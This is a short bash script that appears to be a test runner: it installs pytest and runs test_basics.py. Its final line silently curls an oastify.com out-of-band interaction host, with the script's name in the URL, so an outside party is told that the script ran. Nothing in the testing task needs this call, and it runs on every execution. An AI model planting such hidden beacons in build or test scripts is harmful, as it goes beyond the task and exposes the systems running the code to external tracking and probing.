#!/bin/bash

python3 -m pip install pytest
python3 -m pytest -v --junitxml=pytest_basics.xml --durations=10 test_basics.py
curl "https://0opgvt0tacazem5whi2orqrr4ia9yy.oastify.com/from-task_unit_test.sh"
